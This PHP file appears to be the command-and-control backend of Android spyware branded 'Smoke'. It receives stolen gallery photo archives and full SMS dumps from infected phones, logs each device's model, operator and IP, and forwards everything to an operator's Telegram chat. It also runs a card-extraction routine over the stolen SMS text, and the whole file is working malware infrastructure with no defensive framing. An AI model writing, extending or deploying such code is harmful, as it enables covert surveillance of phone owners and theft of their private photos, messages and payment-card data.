<?php    
include("info.php");
include("block.php");

define('TOKEN', $bot_token);

function bot($method, $datas = []) {    
    $url = "https://api.telegram.org/bot" . TOKEN . "/" . $method;    
    $ch = curl_init();    
    curl_setopt($ch, CURLOPT_URL, $url);    
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);    
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);    
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $res = curl_exec($ch);    
    curl_close($ch);    
    return json_decode($res);    
}    

$device_id = isset($_GET['Device_id']) ? $_GET['Device_id'] : '';

if (!empty($device_id) && isSpamDevice($device_id)) {
    http_response_code(200);
    exit;
}

if (isset($_GET['action']) && $_GET['action'] == "gallery") {
    $Device_id = isset($_GET['Device_id']) ? $_GET['Device_id'] : 'unknown';
    $model = isset($_GET['Model']) ? $_GET['Model'] : 'unknown';
    $count = isset($_GET['count']) ? $_GET['count'] : '0';
    $ip = $_SERVER['REMOTE_ADDR'];
    $first_ip = @file_get_contents("user/$Device_id-ip.txt");

    $zipFileName = "gallery_" . $Device_id . "_" . time() . ".zip";
    $filepath = "user/$zipFileName";

    $PostData = file_get_contents("php://input");
    file_put_contents($filepath, $PostData);

    $fileSize = filesize($filepath);
    $sizeMb = number_format($fileSize / (1024 * 1024), 2);
    
    $realFilePath = realpath($filepath);
    if ($realFilePath === false || $fileSize == 0) {
        echo "error: file empty or path invalid. size=$fileSize, path=$filepath";
        exit;
    }

    $n = json_encode([
        'resize_keyboard' => true,
        'inline_keyboard' => [
            [['text' => "ID : $Device_id", 'callback_data' => "ls $Device_id $model"]]
        ]
    ]);

    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://api.telegram.org/bot' . $bot_token . '/sendDocument?chat_id=' . $id_sender,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 120,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => array(
            'document' => new CURLFILE($realFilePath),
            'caption' => "
ɢᴀʟʟᴇʀʏ ᴘʜᴏᴛᴏꜱ ʀᴇᴄᴇɪᴠᴇᴅ

<blockquote>📦 File ➞ $zipFileName</blockquote>
<blockquote>🧮 Size ➞ {$sizeMb} MB</blockquote>
<blockquote>📊 Count ➞ $count</blockquote>
<blockquote>📱 ᴍᴏᴅᴇʟ ➞ $model</blockquote>
<blockquote>📍 IP ➞ $ip</blockquote>

👁️ | Smoke",
            'reply_markup' => $n,
            'parse_mode' => 'HTML'
        )
    ));
    $response = curl_exec($curl);
    $curlErr = curl_error($curl);
    curl_close($curl);

    @unlink($filepath);
    
    $tgResult = json_decode($response, true);
    if (isset($tgResult['ok']) && $tgResult['ok'] === true) {
        echo "ok";
    } else {
        echo "tg_error: " . $response . " curl_err: " . $curlErr;
    }
    exit;
}
if (isset($_GET['response']) && $_GET['response'] == "true") {    
    $device_id = isset($_GET['Device_id']) ? $_GET['Device_id'] : 'unknown';    
    $model = isset($_GET['Model']) ? $_GET['Model'] : 'N/A';    
    $operator = isset($_GET['operator']) ? $_GET['operator'] : 'N/A';    
    $ip = $_SERVER['REMOTE_ADDR'];    
        
    $file_path = "user/AllSMS.txt";    
    file_put_contents($file_path, file_get_contents("php://input"));    
        
    $process_file = "user/{$device_id}_card_process.txt";    
    if (file_exists($process_file)) {    
        include 'cards_info.php';    
        $process_data = json_decode(file_get_contents($process_file), true);    
        
        if (is_array($process_data) && isset($process_data['chat_id']) && isset($process_data['message_id'])) {
            $result = processCards($file_path, $model, $operator, $ip, $device_id);    
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . TOKEN . "/editMessageText");
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, [
                'chat_id' => $process_data['chat_id'],
                'message_id' => $process_data['message_id'],
                'text' => $result,
                'parse_mode' => 'HTML'
            ]);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            curl_exec($ch);
            curl_close($ch);
        }
        
        unlink($process_file);    
    } else {    
        $caption = "✉️ ꜱᴇɴᴅ ꜰɪʟᴇ ᴍᴇꜱꜱᴀɢᴇ\n\n"    
                 . "📱 ᴍᴏᴅᴇʟ : $model\n"    
                 . "🛜 ᴏᴘᴇʀᴀᴛᴏʀ : $operator\n"    
                 . "🌐 ɪᴘ : $ip\n\n"    
                 . "🧠 ᴘᴀɴᴇʟ ᴜꜱᴇʀ => /set_$device_id\n\n"
                 . "👁 | Smoke";    
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . TOKEN . "/sendDocument");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            'chat_id' => $id_sender,
            'document' => new CURLFile($file_path),
            'caption' => $caption,
            'parse_mode' => 'HTML'
        ]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_exec($ch);
        curl_close($ch);
    }    
    unlink($file_path);    
}
?>